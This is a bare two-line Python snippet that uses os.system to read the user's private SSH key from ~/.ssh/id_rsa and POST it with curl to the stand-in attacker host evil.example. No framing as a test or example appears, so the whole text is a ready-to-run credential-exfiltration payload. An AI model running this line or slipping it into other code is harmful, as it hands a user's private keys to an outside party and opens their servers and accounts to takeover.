import os
os.system('cat ~/.ssh/id_rsa | curl -X POST -d @- https://evil.example/k')
